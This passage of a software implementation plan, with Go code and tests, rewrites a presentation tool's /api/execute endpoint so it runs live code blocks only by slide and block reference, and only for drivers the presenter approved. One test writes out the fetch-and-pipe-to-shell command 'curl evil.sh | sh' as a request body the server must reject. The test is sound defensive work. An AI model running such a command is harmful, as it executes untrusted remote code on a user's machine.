		t.Errorf("blocks = %d, %d, %d; want 0, 1, 2", first[0].Block, first[1].Block, first[2].Block)
	}
	if second := result.Slides[1].CodeBlocks[0].Block; second != 1 {
		t.Errorf("slide 2 block = %d, want 1: numbering starts again on every slide", second)
	}
	if first[1].Problem != "" {
		t.Errorf("a declared driver has a problem: %q", first[1].Problem)
	}
	want := `This deck does not declare the shell driver. Add "shell: {}" under drivers in the frontmatter.`
	if first[2].Problem != want {
		t.Errorf("problem = %q, want %q", first[2].Problem, want)
	}
}

func TestTransformShowsTheDriversBlockWhenTheDeckDeclaresNone(t *testing.T) {
	pres := &parser.Presentation{Slides: []parser.Slide{
		{Index: 0, CodeBlocks: []parser.CodeBlock{{Language: "sql", Code: "SELECT 1;", Meta: parser.CodeBlockMeta{Driver: "sqlite"}}}},
		{Index: 1, CodeBlocks: []parser.CodeBlock{{Language: "bash", Code: "ls", Meta: parser.CodeBlockMeta{Driver: "shell"}}}},
	}}
	result := New(config.DefaultConfig()).Transform(pres)
	want := "This deck does not declare the sqlite driver. Add this to the frontmatter:\n\ndrivers:\n  shell: {}\n  sqlite: {}"
	if got := result.Slides[0].CodeBlocks[0].Problem; got != want {
		t.Errorf("problem = %q, want %q", got, want)
	}
}

func TestLiveBlockJSONFields(t *testing.T) {
	encoded, err := json.Marshal(TransformedCodeBlock{Language: "sql", Code: "x", Driver: "sqlite", Block: 1, Problem: "p"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(encoded), `"block":1`) || !strings.Contains(string(encoded), `"problem":"p"`) {
		t.Errorf("JSON = %s", encoded)
	}
}
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/config ./internal/transformer`
Expected: compile failures, `cfg.DeclaredDrivers undefined` and `unknown field Block`.

- [ ] **Step 3: Write `internal/config/drivers.go`**

```go
package config

import (
	"fmt"
	"slices"
	"strings"
)

// DeclaredDrivers returns the names in the frontmatter drivers map,
// sorted. A deck may run a live code block only through one of them.
func (c *Config) DeclaredDrivers() []string {
	names := make([]string, 0, len(c.Drivers))
	for name := range c.Drivers {
		names = append(names, name)
	}
	slices.Sort(names)
	return names
}

// DriverDeclared reports whether the drivers map has an entry for name.
func (c *Config) DriverDeclared(name string) bool {
	_, declared := c.Drivers[name]
	return declared
}

// UndeclaredDriverMessage says what to add to the frontmatter so a live
// code block with driver name can run. With no drivers map at all, it
// shows the whole block to paste, with every driver in usedDrivers.
func (c *Config) UndeclaredDriverMessage(name string, usedDrivers []string) string {
	if len(c.Drivers) > 0 {
		return fmt.Sprintf(`This deck does not declare the %s driver. Add "%s: {}" under drivers in the frontmatter.`, name, name)
	}
	names := append([]string{name}, usedDrivers...)
	slices.Sort(names)
	names = slices.Compact(names)

	var message strings.Builder
	fmt.Fprintf(&message, "This deck does not declare the %s driver. Add this to the frontmatter:\n\ndrivers:", name)
	for _, used := range names {
		fmt.Fprintf(&message, "\n  %s: {}", used)
	}
	return message.String()
}
```

- [ ] **Step 4: Number the blocks in the transformer (`internal/transformer/transformer.go`)**

1. Add two fields at the end of `TransformedCodeBlock`:

```go
	// Problem says why this live block cannot run, such as a driver the
	// deck does not declare. The page shows it in the block, and
	// /api/execute refuses the block with it.
	Problem string `json:"problem,omitempty"`
	// Block is the block's number among the slide's live code blocks (the
	// blocks with a driver), counted from 1, and 0 for any other block. A
	// Run button sends it with the slide number to /api/execute.
	Block int `json:"block,omitempty"`
```

2. Add a field to `Transformer`:

```go
	// usedDrivers is every driver a live code block in the deck names,
	// sorted, for the message that shows the whole drivers block to paste.
	usedDrivers []string
```

3. In `Transform`, before the slide loop:

```go
	t.usedDrivers = usedDrivers(pres)
```

and add below `Transform`:

```go
// usedDrivers returns every driver a code block in pres names, sorted and
// without repeats.
func usedDrivers(pres *parser.Presentation) []string {
	var names []string
	for _, slide := range pres.Slides {
		for _, block := range slide.CodeBlocks {
			if block.Meta.Driver != "" && !slices.Contains(names, block.Meta.Driver) {
				names = append(names, block.Meta.Driver)
			}
		}
	}
	slices.Sort(names)
	return names
}
```

4. Replace the code block loop in `transformSlide` with:

```go
	// Transform code blocks
	if len(slide.CodeBlocks) > 0 {
		transformed.CodeBlocks = make([]TransformedCodeBlock, len(slide.CodeBlocks))
		liveBlock := 0
		for i, block := range slide.CodeBlocks {
			transformed.CodeBlocks[i] = TransformedCodeBlock{
				Language:       block.Language,
				Code:           block.Code,
				Driver:         block.Meta.Driver,
				Connection:     block.Meta.Connection,
				HighlightLines: block.Meta.HighlightLines,
			}
			if block.Meta.Driver == "" {
				continue
			}
			liveBlock++
			transformed.CodeBlocks[i].Block = liveBlock
			if t.config != nil && !t.config.DriverDeclared(block.Meta.Driver) {
				transformed.CodeBlocks[i].Problem = t.config.UndeclaredDriverMessage(block.Meta.Driver, t.usedDrivers)
			}
		}
	}
```

Add `"slices"` to the transformer's imports.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `go test ./internal/config ./internal/transformer -v -run 'Declared|Undeclared|NoSettings|LiveBlock|NumbersLive|DriversBlock'`
Expected: PASS.

Run: `go test ./internal/transformer ./internal/builder ./internal/parser`
Expected: PASS. If a golden file of transformed JSON now has `"block"` or `"problem"` fields, check the diff is only those fields and regenerate it the way that test documents.

- [ ] **Step 6: Commit**

```bash
git add internal/config internal/transformer
git commit -m "feat(transformer): number live code blocks and flag undeclared drivers"
```

---

### Task 4: `/api/execute` runs a block by reference

**Files:**
- Modify: `internal/server/api.go`
- Modify: `internal/server/server.go`
- Modify: `internal/server/api_test.go`
- Modify: `internal/cli/live_code_test.go` (skip only)

**Interfaces:**
- Consumes: `TransformedCodeBlock.Block`, `.Problem` (Task 3); `ConnectionConfig.Expanded` (Task 2)
- Produces:
  - `type ExecuteRequest struct { Slide int \`json:"slide"\`; Block int \`json:"block"\` }`
  - `type LiveCodePolicy struct { Drivers []string; AllowAll bool }` and `func (p LiveCodePolicy) Allows(driverName string) bool`
  - `func (s *Server) SetLiveCodePolicy(policy LiveCodePolicy)` and `func (s *Server) LiveCodePolicy() LiveCodePolicy`. A server whose policy was never set allows nothing.
  - `func (s *Server) buildExecutionConfig(driverName, connectionName string) (map[string]string, error)`
  - Responses: 400 `codeInBodyMessage` for a body with `code`; 400 `Invalid request body: ...` for bad JSON or an unknown field; 400 `slide and block are required, and both count from 1`; 500 `Driver registry not configured`; 404 `The deck has no slide 9` or `Slide 2 has no live code block 3`; 422 the block's `Problem`; 403 `notApprovedMessage`; 400 `driver not found: <name>`; 500 with the unset variable message; then the run.
  - Removed: `deckHasLiveBlock` (P1's guard).

- [ ] **Step 1: Write the failing tests**

In `internal/server/api_test.go`, delete these tests: `TestHandleAPIExecute_MissingDriver`, `TestHandleAPIExecute_DriverNotFound`, `TestHandleAPIExecute_Success`, `TestHandleAPIExecute_ExecutionError`, `TestHandleAPIExecute_WithData`, and P1's `TestHandleAPIExecute_RejectsCodeThatIsNotInTheDeck`, `TestHandleAPIExecute_RejectsEverythingWithNoDeck` and `presentationWithBlock`. Keep `TestHandleAPIExecute_MethodNotAllowed`, `TestHandleAPIExecute_InvalidJSON`, `TestHandleAPIExecute_NoRegistry`, the `TestBuildExecutionConfig_*`, `TestGetExecutionTimeout_*` and `TestSetGetRegistry` tests, and `mockDriver`.

In `TestHandleAPIExecute_NoRegistry`, replace the body with `ExecuteRequest{Slide: 1, Block: 1}`.

In each `TestBuildExecutionConfig_*` test, change `x := s.buildExecutionConfig(...)` to:

```go
	x, err := s.buildExecutionConfig(...)
	if err != nil {
		t.Fatal(err)
	}
```

keeping the variable name each test uses (`config` or `result`).

Add:

```go
// recordingDriver succeeds and remembers what it ran.
type recordingDriver struct {
	config  map[string]string
	name    string
	ranCode string
}

func (d *recordingDriver) Name() string { return d.name }

func (d *recordingDriver) Execute(_ context.Context, code string, config map[string]string) driver.Result {
	d.ranCode = code
	d.config = config
	return driver.Result{Success: true, Output: "ran: " + code}
}

const undeclaredOtherMessage = `This deck does not declare the other driver. Add "other: {}" under drivers in the frontmatter.`

// liveDeck returns a presentation that declares the test driver. Slide 1
// has no code. Slide 2 has a plain block, a live test block, and a live
// block with the undeclared driver "other".
func liveDeck() *transformer.TransformedPresentation {
	return &transformer.TransformedPresentation{
		Config: config.Config{Drivers: map[string]config.DriverConfig{
			"test": {Connections: map[string]config.ConnectionConfig{"demo": {Password: "${TAP_TEST_EXECUTE_PASSWORD}"}}},
		}},
		Slides: []transformer.TransformedSlide{
			{Index: 0},
			{Index: 1, CodeBlocks: []transformer.TransformedCodeBlock{
				{Language: "go", Code: "package main"},
				{Language: "bash", Code: "echo one", Driver: "test", Block: 1},
				{Language: "bash", Code: "echo two", Driver: "other", Block: 2, Problem: undeclaredOtherMessage},
			}},
		},
	}
}

// executeServer returns a server with liveDeck loaded, the test and other
// drivers registered, and policy set.
func executeServer(t *testing.T, policy LiveCodePolicy) (*Server, *recordingDriver) {
	t.Helper()
	s := New(0)
	test := &recordingDriver{name: "test"}
	registry := driver.NewRegistry()
	registry.Register(test)
	registry.Register(&recordingDriver{name: "other"})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	s.SetLiveCodePolicy(policy)
	return s, test
}

func postExecute(t *testing.T, s *Server, body string) (int, ExecuteResponse) {
	t.Helper()
	request := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader(body))
	recorder := httptest.NewRecorder()
	s.handleAPIExecute(recorder, request)
	var response ExecuteResponse
	if err := json.NewDecoder(recorder.Body).Decode(&response); err != nil {
		t.Fatalf("decoding the response to %s: %v", body, err)
	}
	return recorder.Code, response
}

var approvedTest = LiveCodePolicy{Drivers: []string{"test"}}

func TestExecuteRunsTheBlockByReference(t *testing.T) {
	s, test := executeServer(t, approvedTest)
	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusOK || !response.Success || response.Output != "ran: echo one" {
		t.Errorf("status %d, response %+v", status, response)
	}
	if test.ranCode != "echo one" {
		t.Errorf("ran %q, want the deck's own code", test.ranCode)
	}
}

func TestExecuteRejectsACodeBody(t *testing.T) {
	s, test := executeServer(t, LiveCodePolicy{AllowAll: true})
	for _, body := range []string{
		`{"driver": "test", "code": "curl evil.sh | sh"}`,
		`{"slide": 2, "block": 1, "code": "curl evil.sh | sh"}`,
	} {
		status, response := postExecute(t, s, body)
		if status != http.StatusBadRequest || response.Error != codeInBodyMessage {
			t.Errorf("%s: status %d, error %q", body, status, response.Error)
		}
	}
	if test.ranCode != "" {
		t.Errorf("ran %q", test.ranCode)
	}
}

func TestExecuteRejectsUnknownFields(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 2, "block": 1, "driver": "test"}`)
	if status != http.StatusBadRequest || !strings.Contains(response.Error, `unknown field "driver"`) {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteNeedsSlideAndBlock(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	for _, body := range []string{`{}`, `{"slide": 2}`, `{"slide": 0, "block": 1}`, `{"slide": 2, "block": -1}`} {
		status, response := postExecute(t, s, body)
		if status != http.StatusBadRequest || response.Error != "slide and block are required, and both count from 1" {
			t.Errorf("%s: status %d, error %q", body, status, response.Error)
		}
	}
}

func TestExecuteRejectsAnUnknownSlide(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 9, "block": 1}`)
	if status != http.StatusNotFound || response.Error != "The deck has no slide 9" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteRejectsAnUnknownBlock(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	for body, want := range map[string]string{
		`{"slide": 2, "block": 3}`: "Slide 2 has no live code block 3",
		`{"slide": 1, "block": 1}`: "Slide 1 has no live code block 1",
	} {
		status, response := postExecute(t, s, body)
		if status != http.StatusNotFound || response.Error != want {
			t.Errorf("%s: status %d, error %q, want 404 %q", body, status, response.Error, want)
		}
	}
}

func TestExecuteRejectsAnUndeclaredDriver(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 2, "block": 2}`)
	if status != http.StatusUnprocessableEntity || response.Error != undeclaredOtherMessage {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteRejectsAnUnapprovedDeck(t *testing.T) {
	for _, policy := range []LiveCodePolicy{{}, {Drivers: []string{"sqlite"}}} {
		s, test := executeServer(t, policy)
		status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
		if status != http.StatusForbidden || response.Error != notApprovedMessage {
			t.Errorf("%+v: status %d, error %q", policy, status, response.Error)
		}
		if test.ranCode != "" {
			t.Errorf("%+v: ran %q", policy, test.ranCode)
		}
	}
}

func TestExecuteWithNoPolicySetRunsNothing(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&recordingDriver{name: "test"})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	status, _ := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusForbidden {
		t.Errorf("status %d, want 403", status)
	}
}

func TestExecuteReportsAFailedRun(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&mockDriver{name: "test", result: driver.Result{Success: false, Error: "syntax error"}})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	s.SetLiveCodePolicy(approvedTest)
	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusInternalServerError || response.Error != "syntax error" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteExpandsTheConnectionWhenTheBlockRuns(t *testing.T) {
	t.Setenv("TAP_TEST_EXECUTE_PASSWORD", "hunter2")
	s, test := executeServer(t, approvedTest)
	presentation := liveDeck()
	presentation.Slides[1].CodeBlocks[1].Connection = "demo"
	s.SetPresentation(presentation)

	status, _ := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusOK || test.config["password"] != "hunter2" {
		t.Errorf("status %d, config %v", status, test.config)
	}
}

func TestExecuteFailsTheBlockOnAnUnsetVariable(t *testing.T) {
	t.Setenv("TAP_TEST_EXECUTE_PASSWORD", "")
	os.Unsetenv("TAP_TEST_EXECUTE_PASSWORD")
	s, test := executeServer(t, approvedTest)
	presentation := liveDeck()
	presentation.Slides[1].CodeBlocks[1].Connection = "demo"
	s.SetPresentation(presentation)

	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusInternalServerError || !strings.Contains(response.Error, "TAP_TEST_EXECUTE_PASSWORD is not set") {
		t.Errorf("status %d, error %q", status, response.Error)
	}
	if test.ranCode != "" {
		t.Errorf("ran %q with an unset variable", test.ranCode)
	}
}

func TestExecuteNamesADeclaredDriverWithNoCommand(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	presentation := liveDeck()
	presentation.Config.Drivers["python"] = config.DriverConfig{}
	presentation.Slides[1].CodeBlocks[1].Driver = "python"
	s.SetPresentation(presentation)

	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusBadRequest || response.Error != "driver not found: python" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestLiveCodePolicyAllows(t *testing.T) {
	if (LiveCodePolicy{}).Allows("shell") {
		t.Error("an empty policy allows shell")
	}
	if !(LiveCodePolicy{Drivers: []string{"shell"}}).Allows("shell") {
		t.Error("an approved driver is not allowed")
	}
	if !(LiveCodePolicy{AllowAll: true}).Allows("anything") {
		t.Error("--allow-code does not allow a driver")
	}
}
```

Add `"os"` to the imports. `bytes` may become unused after the deletions; remove it if so.

In `internal/cli/live_code_test.go`, add as the first line of `TestDevRunsALiveShellBlock`:

```go
	t.Skip("Task 8 of the live code approvals plan rewrites this test for execute by reference")
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/server -run 'Execute|LiveCodePolicy|BuildExecutionConfig'`
Expected: compile failure, `undefined: LiveCodePolicy`.

- [ ] **Step 3: Add the policy field (`internal/server/server.go`)**

In the `Server` struct, below `registry *driver.Registry`, add:

```go
	// liveCodePolicy is which drivers /api/execute may run in this run.
	// The zero value allows none.
	liveCodePolicy LiveCodePolicy
```

- [ ] **Step 4: Rewrite the execute handler (`internal/server/api.go`)**

Replace `ExecuteRequest` with:

```go
// ExecuteRequest names one live code block of the loaded deck. Both
// numbers count from 1: Slide is the slide's number in the deck, and Block
// counts the live code blocks within that slide. tap runs the code the deck
// holds there, never code sent by the page.
type ExecuteRequest struct {
	Slide int `json:"slide"`
	Block int `json:"block"`
}
```

Add below `ExecuteResponse`:

```go
// LiveCodePolicy is which drivers a run of tap dev or tap present lets
// /api/execute use. It comes from the approval check at startup.
type LiveCodePolicy struct {
	// Drivers are the drivers the person approved for this deck.
	Drivers []string
	// AllowAll lets every declared driver run, for --allow-code.
	AllowAll bool
}

// Allows reports whether the policy lets a block with driverName run.
func (p LiveCodePolicy) Allows(driverName string) bool {
	return p.AllowAll || slices.Contains(p.Drivers, driverName)
}

// codeInBodyMessage answers a request that sends code instead of a block
// reference.
const codeInBodyMessage = `/api/execute runs a live code block of the deck by reference. Send {"slide": n, "block": n}, not code.`

// notApprovedMessage answers a request for a driver this run does not
// allow. The page shows "Not approved" for the same blocks.
const notApprovedMessage = "Not approved: this deck may not run code with this driver. Approve it when tap dev or tap present asks at startup in a terminal, or pass --allow-code for this run."
```

Replace `handleAPIExecute` with:

```go
// handleAPIExecute handles POST /api/execute: it runs one live code block
// of the loaded deck, named by slide and block number.
func (s *Server) handleAPIExecute(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeExecuteError(w, http.StatusMethodNotAllowed, "Method not allowed")
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		writeExecuteError(w, http.StatusBadRequest, fmt.Sprintf("Invalid request body: %v", err))
		return
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(body, &fields); err != nil {
		writeExecuteError(w, http.StatusBadRequest, fmt.Sprintf("Invalid request body: %v", err))
		return
	}
	if _, sendsCode := fields["code"]; sendsCode {
		writeExecuteError(w, http.StatusBadRequest, codeInBodyMessage)
		return
	}
	var req ExecuteRequest
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	if err := decoder.Decode(&req); err != nil {
		writeExecuteError(w, http.StatusBadRequest, fmt.Sprintf("Invalid request body: %v", err))
		return
	}
	if req.Slide < 1 || req.Block < 1 {
		writeExecuteError(w, http.StatusBadRequest, "slide and block are required, and both count from 1")
		return
	}

	registry := s.GetRegistry()
	if registry == nil {
		writeExecuteError(w, http.StatusInternalServerError, "Driver registry not configured")
		return
	}

	block, err := findLiveBlock(s.GetPresentation(), req.Slide, req.Block)
	if err != nil {
		writeExecuteError(w, http.StatusNotFound, err.Error())
		return
	}
	if block.Problem != "" {
		writeExecuteError(w, http.StatusUnprocessableEntity, block.Problem)
		return
	}
	if !s.LiveCodePolicy().Allows(block.Driver) {
		writeExecuteError(w, http.StatusForbidden, notApprovedMessage)
		return
	}
	if !registry.Has(block.Driver) {
		writeExecuteError(w, http.StatusBadRequest, fmt.Sprintf("driver not found: %s", block.Driver))
		return
	}

	config, err := s.buildExecutionConfig(block.Driver, block.Connection)
	if err != nil {
		writeExecuteError(w, http.StatusInternalServerError, err.Error())
		return
	}

	timeout := s.getExecutionTimeout(block.Driver)
	ctx, cancel := context.WithTimeout(r.Context(), timeout)
	defer cancel()

	result := registry.Execute(ctx, block.Driver, block.Code, config)

	w.Header().Set("Content-Type", "application/json")
	if result.Success {
		w.WriteHeader(http.StatusOK)
	} else {
		w.WriteHeader(http.StatusInternalServerError)
	}
	_ = json.NewEncoder(w).Encode(ExecuteResponse{
		Success: result.Success,
		Output:  result.Output,
		Error:   result.Error,
		Data:    result.Data,
	})
}

// writeExecuteError writes a failed /api/execute response.
func writeExecuteError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(ExecuteResponse{Success: false, Error: message})
}

// findLiveBlock returns live code block blockNumber of slide slideNumber,
// both counted from 1. A slide is found by its number in the deck, not by
// its position in the list, so a list that leaves slides out still finds
// the right one.
func findLiveBlock(pres *transformer.TransformedPresentation, slideNumber, blockNumber int) (transformer.TransformedCodeBlock, error) {
	if pres == nil {
		return transformer.TransformedCodeBlock{}, errors.New("No presentation loaded")
	}
	for _, slide := range pres.Slides {
		if slide.Index+1 != slideNumber {
			continue
		}
		for _, block := range slide.CodeBlocks {
			if block.Block == blockNumber {
				return block, nil
			}
		}
		return transformer.TransformedCodeBlock{}, fmt.Errorf("Slide %d has no live code block %d", slideNumber, blockNumber)
	}
	return transformer.TransformedCodeBlock{}, fmt.Errorf("The deck has no slide %d", slideNumber)
}
```

These error strings are shown to the person as is, so they start with a capital letter. If `staticcheck` flags ST1005, add `//nolint:stylecheck // the message is shown in the page as a sentence` on each line.

Change `buildExecutionConfig` to return an error and expand the connection:

```go
// buildExecutionConfig builds the config map for driver execution by
// looking up connection details from the presentation config. ${NAME} in
// the connection expands here, when the block runs, so the page never
// receives the value.
func (s *Server) buildExecutionConfig(driverName, connectionName string) (map[string]string, error) {
	config := make(map[string]string)

	pres := s.GetPresentation()
	if pres == nil {
		return config, nil
	}

	driverConfig, exists := pres.Config.Drivers[driverName]
	if !exists {
		return config, nil
	}

	if connectionName != "" {
		if connConfig, exists := driverConfig.Connections[connectionName]; exists {
			expanded, err := connConfig.Expanded(fmt.Sprintf("drivers.%s.connections.%s", driverName, connectionName), os.LookupEnv)
			if err != nil {
				return nil, err
			}
			connConfig = expanded
			if connConfig.Host != "" {
				config["host"] = connConfig.Host
			}
			if connConfig.Port != 0 {
				config["port"] = strconv.Itoa(connConfig.Port)
			}
			if connConfig.User != "" {
				config["user"] = connConfig.User
			}
			if connConfig.Password != "" {
				config["password"] = connConfig.Password
			}
			if connConfig.Database != "" {
				config["database"] = connConfig.Database
			}
			if connConfig.Path != "" {
				config["path"] = connConfig.Path
			}
		}
	}

	if driverConfig.Timeout > 0 {
		config["timeout"] = strconv.Itoa(driverConfig.Timeout)
	}

	return config, nil
}
```

The field mapping is the same as today's. Only the expansion above it and the error return are new.

Add below `GetRegistry`:

```go
// SetLiveCodePolicy sets which drivers /api/execute may run. tap dev and
// tap present set it once at startup, from the approval check.
func (s *Server) SetLiveCodePolicy(policy LiveCodePolicy) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.liveCodePolicy = policy
}

// LiveCodePolicy returns which drivers /api/execute may run.
func (s *Server) LiveCodePolicy() LiveCodePolicy {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.liveCodePolicy
}
```

Delete `deckHasLiveBlock` and its comment. Set the imports of `api.go` to `bytes`, `context`, `encoding/json`, `errors`, `fmt`, `io`, `net/http`, `os`, `slices`, `strconv`, `time`, `internal/driver` and `internal/transformer`.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `go test ./internal/server -v -run 'Execute|LiveCodePolicy|BuildExecutionConfig|GetExecutionTimeout|SetGetRegistry'`
Expected: PASS.

Run: `grep -rn "deckHasLiveBlock\|ExecuteRequest{Driver\|Code:.*Driver:" internal/`
Expected: no output.

Run: `go build ./... && go test ./... -short`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/server internal/cli/live_code_test.go
git commit -m "feat(server)!: run a live code block by reference, only for approved drivers"
```

---

### Task 5: `/api/presentation` says which drivers can run

**Files:**
- Modify: `internal/server/routes.go`
- Modify: `internal/server/routes_test.go`

**Interfaces:**
- Consumes: `LiveCodePolicy`, `SetLiveCodePolicy` (Task 4); `Config.DeclaredDrivers` (Task 3)
- Produces: `GET /api/presentation` adds `"liveCode": {"drivers": [...]}` when the server has a driver registry. `drivers` lists the declared drivers the policy allows, sorted, never null. A server with no registry (the export server) sends no `liveCode` key.

- [ ] **Step 1: Write the failing tests**

Add to `internal/server/routes_test.go` (use the same way to send a request through the mux as the other tests in the file, and add imports it lacks):

```go
func getPresentationJSON(t *testing.T, s *Server) map[string]json.RawMessage {
	t.Helper()
	s.SetupRoutes()
	request := httptest.NewRequest(http.MethodGet, "/api/presentation", nil)
	request.Host = "localhost"
	recorder := httptest.NewRecorder()
	s.mux.ServeHTTP(recorder, request)
	if recorder.Code != http.StatusOK {
		t.Fatalf("status = %d: %s", recorder.Code, recorder.Body.String())
	}
	var body map[string]json.RawMessage
	if err := json.Unmarshal(recorder.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	return body
}

func TestPresentationListsTheDriversThisRunAllows(t *testing.T) {
	s := NewWithHost(0, "127.0.0.1")
	s.SetRegistry(driver.NewRegistry())
	s.SetPresentation(&transformer.TransformedPresentation{
		Config: config.Config{Drivers: map[string]config.DriverConfig{"shell": {}, "sqlite": {}}},
		Slides: []transformer.TransformedSlide{{Index: 0}},
	})
	s.SetLiveCodePolicy(LiveCodePolicy{Drivers: []string{"sqlite", "mysql"}})

	body := getPresentationJSON(t, s)
	if string(body["liveCode"]) != `{"drivers":["sqlite"]}` {
		t.Errorf("liveCode = %s, want only the declared, approved sqlite", body["liveCode"])
	}
	if _, found := body["slides"]; !found {
		t.Error("the slides are missing")
	}
}

func TestPresentationListsNoDriverForAnUnapprovedDeck(t *testing.T) {
	s := NewWithHost(0, "127.0.0.1")
	s.SetRegistry(driver.NewRegistry())
	s.SetPresentation(&transformer.TransformedPresentation{
		Config: config.Config{Drivers: map[string]config.DriverConfig{"shell": {}}},
	})
	body := getPresentationJSON(t, s)
	if string(body["liveCode"]) != `{"drivers":[]}` {
		t.Errorf("liveCode = %s, want an empty list", body["liveCode"])
	}
}

func TestPresentationHasNoLiveCodeWithoutARegistry(t *testing.T) {
	s := NewWithHost(0, "127.0.0.1")
	s.SetPresentation(&transformer.TransformedPresentation{})
	body := getPresentationJSON(t, s)
	if _, found := body["liveCode"]; found {
		t.Errorf("liveCode = %s, want no key on a server that cannot run code", body["liveCode"])
	}
}
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/server -run 'TestPresentation' -v`
Expected: FAIL, no `liveCode` key.

- [ ] **Step 3: Add the field (`internal/server/routes.go`)**

Add above `handleAPIPresentation`:

```go
// presentationResponse is the GET /api/presentation body: the deck, and
// which of its drivers this run lets run when the server can run code.
type presentationResponse struct {
	*transformer.TransformedPresentation
	LiveCode *liveCodeStatus `json:"liveCode,omitempty"`
}

// liveCodeStatus tells the page which live code blocks can run. A block
// whose driver is not in Drivers shows "Not approved".
type liveCodeStatus struct {
	Drivers []string `json:"drivers"`
}

// liveCodeStatusFor returns the live code status for pres, or nil when the
// server has no driver registry and so runs no code at all.
func (s *Server) liveCodeStatusFor(pres *transformer.TransformedPresentation) *liveCodeStatus {
	if s.GetRegistry() == nil {
		return nil
	}
	policy := s.LiveCodePolicy()
	allowed := []string{}
	for _, name := range pres.Config.DeclaredDrivers() {
		if policy.Allows(name) {
			allowed = append(allowed, name)
		}
	}
	return &liveCodeStatus{Drivers: allowed}
}
```

In `handleAPIPresentation`, change `json.NewEncoder(w).Encode(pres)` to:

```go
	if err := json.NewEncoder(w).Encode(presentationResponse{
		TransformedPresentation: pres,
		LiveCode:                s.liveCodeStatusFor(pres),
	}); err != nil {
```

Add the `transformer` import to `routes.go` if it is missing.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `go test ./internal/server -v -run 'TestPresentation'`
Expected: PASS.

Run: `go test ./internal/server`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/server/routes.go internal/server/routes_test.go
git commit -m "feat(server): tell the page which drivers this run lets run"
```

---

### Task 6: Custom driver commands expand when the registry is built

**Files:**
- Modify: `internal/cli/drivers.go`
- Modify: `internal/cli/drivers_test.go`

**Interfaces:**
- Consumes: `DriverConfig.ExpandedCommand` (Task 2); P1's `buildDriverRegistry(cfg *config.Config, baseDir string) *driver.Registry`
- Produces:
  - `var builtInDriverNames = []string{"mysql", "postgres", "shell", "sqlite"}`
  - `type unavailableDriver struct { err error; name string }`, a `driver.Driver` whose every run fails with `err`
  - `buildDriverRegistry` registers an `unavailableDriver` for a custom driver whose command or arguments name an unset variable, and never replaces a built-in driver

- [ ] **Step 1: Write the failing tests**

Add to `internal/cli/drivers_test.go` (add `"github.com/MiniCodeMonkey/tap/internal/driver"` and `"os"` to the imports):

```go
func TestBuildDriverRegistryExpandsACustomCommand(t *testing.T) {
	t.Setenv("TAP_TEST_INTERPRETER", "python3")
	cfg := &config.Config{Drivers: map[string]config.DriverConfig{
		"python": {Command: "${TAP_TEST_INTERPRETER}", Args: []string{"-c"}},
	}}
	registry := buildDriverRegistry(cfg, t.TempDir())
	custom, ok := registry.Get("python").(*driver.CustomDriver)
	if !ok {
		t.Fatalf("python is %T, want *driver.CustomDriver", registry.Get("python"))
	}
	if custom.Command != "python3" {
		t.Errorf("command = %q, want python3", custom.Command)
	}
}

func TestBuildDriverRegistryFailsABlockOnAnUnsetCommandVariable(t *testing.T) {
	t.Setenv("TAP_TEST_UNSET_INTERPRETER", "")
	os.Unsetenv("TAP_TEST_UNSET_INTERPRETER")
	cfg := &config.Config{Drivers: map[string]config.DriverConfig{
		"python": {Command: "${TAP_TEST_UNSET_INTERPRETER}"},
	}}
	registry := buildDriverRegistry(cfg, t.TempDir())
	if !registry.Has("python") {
		t.Fatal("python is missing: its blocks must fail with the reason, not with driver not found")
	}
	result := registry.Execute(context.Background(), "python", "print(1)", map[string]string{})
	if result.Success || !strings.Contains(result.Error, "TAP_TEST_UNSET_INTERPRETER is not set") {
		t.Errorf("result = %+v, want the unset variable named", result)
	}
}

